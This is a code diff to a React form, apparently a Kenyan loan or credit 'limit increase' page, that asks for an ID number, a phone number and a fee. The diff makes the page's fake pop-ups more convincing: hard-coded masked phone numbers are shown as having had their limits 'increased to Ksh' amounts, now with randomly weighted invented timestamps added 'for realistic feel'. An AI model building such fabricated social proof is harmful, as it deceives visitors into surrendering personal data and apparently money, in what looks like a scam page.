@@ -15,12 +15,36 @@ const notifications = [
   { phone: "0791****89", limit: 45000 },
 ];
 
+// Weighted times for realistic feel
+const notificationTimes = [
+  { label: "just now", weight: 50 },
+  { label: "3 mins ago", weight: 25 },
+  { label: "5 mins ago", weight: 15 },
+  { label: "6 mins ago", weight: 7 },
+  { label: "10 mins ago", weight: 3 },
+];
+
+// Helper function to pick weighted random time
+const getRandomTime = () => {
+  const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
+  let rand = Math.random() * totalWeight;
+
+  for (const t of notificationTimes) {
+    if (rand < t.weight) return t.label;
+    rand -= t.weight;
+  }
+  return "just now";
+};
+
 const PersonalDetails = () => {
   const navigate = useNavigate();
   const { state } = useLocation();
 
   const [limitData, setLimitData] = useState<{ amount: number; fee: number } | null>(null);
-  const [currentNotification, setCurrentNotification] = useState(notifications[0]);
+  const [currentNotification, setCurrentNotification] = useState({
+    ...notifications[0],
+    time: "just now",
+  });
   const [showNotification, setShowNotification] = useState(true);
   const [idNumber, setIdNumber] = useState("");
   const [phone, setPhone] = useState("");
@@ -30,29 +54,39 @@ const PersonalDetails = () => {
   useEffect(() => {
     if (state?.amount && state?.fee) {
       setLimitData({ amount: state.amount, fee: state.fee });
-      sessionStorage.setItem("selectedLimit", JSON.stringify({ amount: state.amount, fee: state.fee }));
+      sessionStorage.setItem(
+        "selectedLimit",
+        JSON.stringify({ amount: state.amount, fee: state.fee })
+      );
     } else {
       const storedLimit = JSON.parse(sessionStorage.getItem("selectedLimit") || "null");
       if (storedLimit) setLimitData(storedLimit);
     }
   }, [state]);
 
-  // Rotate notifications
+  // Rotate notifications with weighted times
   useEffect(() => {
     const interval = setInterval(() => {
       setShowNotification(false);
+
       setTimeout(() => {
         const randomIndex = Math.floor(Math.random() * notifications.length);
-        setCurrentNotification(notifications[randomIndex]);
+
+        setCurrentNotification({
+          ...notifications[randomIndex],
+          time: getRandomTime(),
+        });
+
         setShowNotification(true);
       }, 300);
     }, 4000);
+
     return () => clearInterval(interval);
   }, []);
 
   // Validation
   const isIdValid = /^\d{6,10}$/.test(idNumber);
-  const isPhoneValid = /^(7|1)\d{8}$/.test(phone);
+  const isPhoneValid = /^(0?[71]\d{8})$/.test(phone);
   const isFormValid = isIdValid && isPhoneValid && !loading && limitData !== null;
 
   const handleVerify = async () => {
@@ -107,11 +141,12 @@ const PersonalDetails = () => {
       </div>
 
       {/* NOTIFICATION */}
-      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
+      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
         <div className="notification-icon"></div>
         <div className="notification-content">
-          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
-          <div className="notification-time">• just now</div>
+          <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
+          {currentNotification.limit.toLocaleString()}
+          <div className="notification-time">• {currentNotification.time}</div>
         </div>
       </div>
 
@@ -143,7 +178,7 @@ const PersonalDetails = () => {
           <span className="prefix">+254</span>
           <input
             type="text"
-            placeholder="7xx xxx xxx"
+            placeholder="07xx xxx xxx or 01xx xxx xxx"
             value={phone}
             onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
           />
